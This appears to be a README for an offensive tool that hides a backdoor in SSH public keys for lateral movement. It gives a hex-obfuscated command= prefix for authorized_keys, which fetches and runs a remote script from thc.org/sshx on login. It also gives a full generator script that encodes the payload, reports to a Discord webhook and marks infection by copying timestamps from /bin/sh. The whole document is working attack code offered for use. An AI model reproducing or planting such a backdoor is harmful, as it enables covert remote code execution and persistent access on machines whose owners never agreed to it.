
# SSH Public Key Backdoor

Se

Generate a backdoor to hide in an ssh pubkey, e.g. in `id_rsa.pub` or `authorized_keys`. Executes on user's next login. 

**Goal**: Lateral movement by taking advantage of the tendency to copy ssh pubkeys between machines without checking content.

Add a backdoor string to the beginning of the pubkey. 

## Example

Add up to, but not including, `ssh-ed255191...`

```
no-user-rc,no-X11-forwarding,command="`###---POWERSHELL---`;eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c207468632e6f72672f737368782922207c7c2062617368202d632022242877676574202d2d6e6f2d766572626f7365202d4f2d207468632e6f72672f737368782922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);" ssh-ed25519 AAAAC3Nzblah....
```


## Create your own backdoor

```bash
#! /bin/bash

# Create a BACKDOOR-STUB for ~/.ssh/authorized_keys or ~/.ssh/id_rsa.pub

if [[ -t 1 ]]; then
    CDR="\\033[0;31m" # red
    CDY="\\033[0;33m" # yellow
    CY="\\033[1;33m" # yellow
    CDM="\\033[0;35m" # magenta
    CM="\\033[1;35m" # magenta
    CDC="\\033[0;36m" # cyan
    CN="\\033[0m"    # none
    out(){ echo "$@";}
else
    out(){ :;}
fi

# This stub is encoded for the ssh-key 'command='.
stubs(){ ###___STUBS___
    # - Check if /bin/sh and .ssh have the same date. We set it to the _same_ date
    #   to mark that the backdoor has been installed.
    # Note: Do not remove the ':' at the end of the first and last line.
    [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && { :
        touch -r /bin/sh .ssh
        ###-----BEGIN BACKDOOR-----
        # Anything from here until -----END BACKDOOR----- will
        # be executed once when the user logs in. All output goes
        # to stderr.
        #
        # In our DEMO example we request a backdoor script
        # from thc.org/sshx. PLEASE CHANGE THIS.
        #
        # Set a DISCORD KEY:
        export KEY="%%KEY%%"
        # Request and execute sshx (which will install gs-netcat and
        # report the result back to our DISCORD channel)
        bash -c "$(curl -fsSL thc.org/sshx)" || bash -c "$(wget --no-verbose -O- thc.org/sshx)" || exit 0
        ###-----END BACKDOOR-----
    } >/dev/null 2>/dev/null & :
    [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
    [[ -z $SHELL ]] && SHELL=/bin/bash
    [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
    [[ -f /etc/motd ]] && cat /etc/motd
    exec -a -$(basename $SHELL) $SHELL
} ###___STUBS___

# Read my own script and extract the above stub into a variable.
get_stubs()
{
    local IFS
    IFS=""
    STUB="$(<"$0")"
    STUB="${STUB#*___STUBS___}"
    STUB="${STUB%%\} \#\#\#___STUBS___*}"
}

get_stubs
cmd=$(echo "$STUB" | sed 's/^[[:blank:]]*//' | sed '/^$/d' | sed '/^#/d' | tr '\n' ';' | sed "s|%%KEY%%|${KEY}|")

if [[ $1 == clear ]]; then
    cmd=${cmd//\"/\\\"}
else
    bd=$(echo "$cmd" | xxd -ps -c2048)
    cmd="eval \$(echo $bd|xxd -r -ps);"
fi

[[ -z $KEY ]] && out -e "=========================================================================
${CDR}WARNING${CN}: The default reports to THC's Discord channel.
Set your own DISCORD WEBHOOK KEY:
    ${CDC}KEY=\"<Your Discord Webhook Key>\" $0${CN}
========================================================================="

out -e "${CDY}Prepend this to every line in ${CY}~/.ssh/authorized_keys${CDY}
and ${CY}~/.ssh/id_rsa.pub${CDY} so that it looks like this${CN}:"
echo -en "${CM}no-user-rc,no-X11-forwarding,command=\"${CDM}\`###---POWERSHELL---\`;${cmd}${CM}\"${CN}"
# echo -en "${CM}command=${CM}\"${CDM}\`###---POWERSHELL---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
out " ssh-ed25519 AAAAC3Nzblah...."
```

**Usage**: Edit between `---BEGIN BACKDOOR---` and `---END BACKDOOR---`. Commands:

```shell
# Example 1: Set your down Discord API key for Discord exfil
export KEY="<key>"
./ssh-key-backdoor.sh

# View plain commands without hex encoding for test
./ssh-key-backdoor.sh
```

Thanks to The Hacker's Choice:

https://github.com/hackerschoice/ssh-key-backdoor

Technique details writeup:

https://blog.thc.org/infecting-ssh-public-keys-with-backdoors
